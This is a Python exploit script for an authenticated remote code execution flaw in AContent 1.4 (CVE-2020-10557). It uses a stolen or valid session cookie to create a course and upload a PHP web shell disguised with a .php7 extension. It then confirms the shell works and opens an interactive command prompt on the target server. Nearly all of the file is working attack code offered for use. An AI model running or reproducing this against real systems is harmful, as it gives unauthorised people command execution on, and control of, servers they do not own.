#!/usr/bin/env python3

# AContent 1.4 Authenticated RCE
# By: cinzinga
# Thanks to: Tib3rius, m0rph-1 


# Example Usage:
# python3 cve-2020-10557.py -url http://192.168.0.25 -cookie ancn0qngqjke3gd4h4asll9uo5

import argparse
import random
import requests
import string
import sys
import hashlib 
import requests


course_id = 0

def arguments():
    parser = argparse.ArgumentParser(description="AContent 1.4 Authenticated RCE")
    parser.add_argument('-url', dest='url', type=str, help='The URL of the target.')
    parser.add_argument('-cookie', dest='cookie', type=str, help='Valid cookie.')

    args = parser.parse_args()
    return args


def main(args):

    cookies = {'TransformableID': args.cookie}
    url = args.url.rstrip('/')


    try:

        session = requests.session()
        get = session.get(url + '/login.php', cookies=cookies)
        if get.status_code != 200:
            print('[!] Authentication Failed! Please check cookie.')
            sys.exit()
        else:
            print('[+] Login Successful')
            course(args, session)

    except Exception as exception_msg:
        print(repr(exception_msg))

def course(args, session):

    url = args.url.rstrip('/')
    cookies = {'TransformableID': args.cookie}
    random_name = ''.join(random.choice(string.ascii_letters) for i in range(5))

    

    try:

        values = {'_course_id': '',
            'this_author': '8', # The user will have to manually edit this number with their own user's author number. To-do: automate this.
            'title': random_name,
            'category_id': '0', 
            'pri_lang': 'en',
            'description': '',
            'copyright': '',
            'submit': 'Save'}

        exploit_req = session.post(url + '/home/course/course_property.php?_course_id=', data=values, cookies=cookies)
        my_string=exploit_req.url
        course_id = my_string.split("=",1)[1]
        print("Course ID = " + course_id)
        exploit(args, session, course_id)


    except Exception as exception_msg:
        print(repr(exception_msg))

def exploit(arg, session, course_id):
    url = args.url.rstrip('/')
    cookies = {'TransformableID': args.cookie}
    random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
    payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'


    file = {'uploadedfile': (random_file + '.php7', payload, 'application/octet-stream')}
    print('[+] Attempting to upload PHP web shell...')
    r = session.post(url + '/file_manager/upload.php', files=file, data={'submit':'Upload', '_course_id': course_id, 'MAX_FILE_SIZE': '', 'pathext': ''},verify=False, cookies=cookies)
    print('[+] Verifying shell upload...')
    r = session.get(url + '/content/' + course_id + '/' + random_file + '.php7', params={'cmd':'echo ' + random_file}, verify=False, cookies=cookies)
    
    if random_file in r.text:
        print('[+] Weapons Hot! Web shell uploaded to ' + url + '/content/' + course_id + '/' + random_file + '.php7')
        launch_shell = input('[+] Do you wish to launch a shell here? (y/n): ')
        if launch_shell.lower() == 'y':
            while True:
                cmd = str(input('RCE $ '))
                if cmd == 'exit':
                    sys.exit(0)
                r = requests.get(url + '/content/' + course_id + '/' + random_file + '.php7', params={'cmd': cmd}, verify=False, cookies=cookies)
                print(r.text)
        else:
            sys.exit()


if __name__ in "__main__":
    args = arguments()
    main(args)
